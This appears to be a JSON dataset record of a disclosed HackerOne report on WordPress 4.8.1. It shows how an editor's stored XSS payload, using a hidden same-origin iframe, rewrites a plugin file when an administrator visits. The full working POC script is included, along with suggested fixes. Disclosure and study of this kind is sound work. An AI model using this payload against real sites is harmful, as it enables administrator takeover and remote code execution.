{
    "reported_to": "WordPress",
    "reported_by": "skansing ",
    "title": "Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general",
    "content": "\nBackground\nThis report is mainly about how a user with the role of editor, expectedly can post unfiltered content\nbut unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.\nSecondarily the report wants to highlight the technique used and the severity of it.\nDescription\nDuring my research I found that a XSS can, in the majority of cases, trivially be turned\ninto a RCE, by abusing same origin frame scripting in the XSS payload.\nI demonstrated this \"technique\" in #263058 and #263109 (no need to read, there a POC in this report).\nIt can be used to do almost any action from the victims perspective, like adding an administrator or editing a plugin file.\nThis adds to the severity of XSS in core wp, themes and especially plugins.\nIt affect the understanding of the user role 'editor' and the ability to post unfiltered content\nhttps://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html\nAn editor is a copy-paste and a administrator visit from RCE or performing any action.\nEditors users / accounts them self are more attractive for cracking and social engineering.\nAdministrators are not aware of the risk associated with giving a user editor role or being a editor.\nAll future reports with XSS can be escalated to RCE resulting in increased severity.\nPOC\nThis POC explores a rogue editor planting payload to RCE.\nLogin as editor\nUpload a .html or plant the POC payload in content\nLogin as administrator visit a link containing the payload\nPOC Payload\nThe payload opens the plugin editor, edits a file and redirects to the edited file afterwards\nCode 526 Bytes\n1<iframe src=\"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\" style=\"opacity:0\">\n2</iframe>\n3<script>\n4setTimeout(function() {\n5  var p = \"<?php phpinfo();\"\n6  // full read/write control over dom, do anything(!)\n7  var d = document.querySelector(\"iframe\").contentWindow.document;\n8  var c = d.querySelector(\"#newcontent\")\n9  var s = d.querySelector(\"#submit\")\n10  c.value = p\n11  s.click();\n12}, 2000);\n13setTimeout(function() {\n14  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n15}, 4000);\n16</script>\nSuggested Fix\nthe role editor should loose all privileges that can lead to scripting\nconsideration on hardening could be doing a BC break and switching to x-frame-options: deny.\nHowever that can by bypassed by using window.open(...) instead of an iframe, but requires\nthe victim to click on the page after opening it. so this will only harden a bit.\nanother hardening option could be requiring password on critical actions such as\nplugin install, file edit, etc. it will however have an impact on accessibility and\nit might take time to find all the loop holes.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1507157580,
    "report_url": "https://hackerone.com/reports/263718",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Login as an editor in WordPress."
        ],
        [
            2,
            "Upload a .html file or plant the POC payload in content."
        ],
        [
            3,
            "Login as an administrator and visit a link containing the payload."
        ],
        [
            4,
            "The payload opens the plugin editor, edits a file, and redirects to the edited file."
        ]
    ],
    "vuln_description": "A rogue editor can plant a payload that leads to Remote Code Execution (RCE) by exploiting same-origin frame scripting. This allows the editor to perform actions as an administrator, such as editing plugin files, due to the XSS vulnerability in WordPress 4.8.1.",
    "reason": "The attack involves multiple components: exploiting XSS, leveraging same-origin frame scripting, and manipulating the plugin editor interface. The interaction between these components is non-obvious, and the attack requires understanding of WordPress admin functionalities and JavaScript manipulation.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}